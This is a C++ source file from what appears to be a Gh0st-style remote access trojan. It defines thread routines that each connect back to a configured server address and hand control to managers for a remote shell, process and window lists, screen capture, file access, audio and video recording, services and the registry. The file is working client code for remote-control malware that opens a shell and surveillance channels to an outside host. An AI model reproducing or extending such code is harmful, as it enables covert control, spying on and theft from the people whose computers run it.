#include "Common.h"
#include "SystemManager.h"
#include "TalkManager.h"
#include "ShellManager.h"
#include "ScreenManager.h"
#include "FileManager.h"
#include "AudioManager.h"
#include "VideoManager.h"
#include "ServicesManager.h"
#include "RegisterManager.h"
//远程进程管理
DWORD WINAPI LoopProcessManager(LPVOID lParam)
{
	IOCPClient ClientObject;
	if (!ClientObject.ConnectServer(g_szServerIp,g_uPort))
	{
		return -1;
	}
	CSystemManager Manager(&ClientObject, COMMAND_SYSTEM);

	ClientObject.RunEventLoop();
	return 0;
}

DWORD WINAPI LoopTalkManager(LPVOID lParam)
{
	IOCPClient ClientObject;
	if (!ClientObject.ConnectServer(g_szServerIp,g_uPort))
	{
		return -1;
	}

	CTalkManager Manager(&ClientObject);
	ClientObject.RunEventLoop();
	return 0;
}

DWORD WINAPI LoopShellManager(LPVOID lParam)
{
	IOCPClient	ClientObject;
	if (!ClientObject.ConnectServer(g_szServerIp, g_uPort))
		return -1;

	CShellManager	Manager(&ClientObject);

	ClientObject.RunEventLoop();

	return 0;
}

DWORD WINAPI LoopWindowManager(LPVOID lParam)
{
	IOCPClient ClientObject;
	if (!ClientObject.ConnectServer(g_szServerIp,g_uPort))
	{
		return -1;
	}
	CSystemManager	Manager(&ClientObject, COMMAND_WSLIST);  //plist wlist
	ClientObject.RunEventLoop();

	return 0;
}

DWORD WINAPI LoopScreenManager(LPVOID lParam)
{

	IOCPClient ClientObject;
	if (!ClientObject.ConnectServer(g_szServerIp, g_uPort))
	{
		return -1;
	}

	CScreenManager	Manager(&ClientObject);

	ClientObject.RunEventLoop();
	return 0;
}

DWORD WINAPI LoopFileManager(LPVOID lParam)
{
	IOCPClient ClientObject;
	if (!ClientObject.ConnectServer(g_szServerIp, g_uPort))
	{
		return -1;
	}
	CFileManager	Manager(&ClientObject);

	ClientObject.RunEventLoop();
	return 0;
}

DWORD WINAPI LoopAudioManager(LPVOID lParam)
{
	IOCPClient ClientObject;
	if (!ClientObject.ConnectServer(g_szServerIp,g_uPort))
	{
		return -1;
	}
	CAudioManager Manager(&ClientObject);
	ClientObject.RunEventLoop();
	return 0;
}

DWORD WINAPI LoopVideoManager(LPVOID lParam)
{
	IOCPClient ClientObject;
	if (!ClientObject.ConnectServer(g_szServerIp, g_uPort))
	{
		return -1;
	}
	CVideoManager Manager(&ClientObject);
	ClientObject.RunEventLoop();
	return 0;
}

DWORD WINAPI LoopServicesManager(LPVOID lParam)
{
	IOCPClient ClientObject;
	if (!ClientObject.ConnectServer(g_szServerIp, g_uPort))
	{
		return -1;
	}
	CServicesManager Manager(&ClientObject);
	ClientObject.RunEventLoop();
	return 0;
}

DWORD WINAPI LoopRegisterManager(LPVOID lParam)
{
	IOCPClient ClientObject;
	if (!ClientObject.ConnectServer(g_szServerIp, g_uPort))
	{
		return -1;
	}
	CRegisterManager Manager(&ClientObject);
	ClientObject.RunEventLoop();
	return 0;
}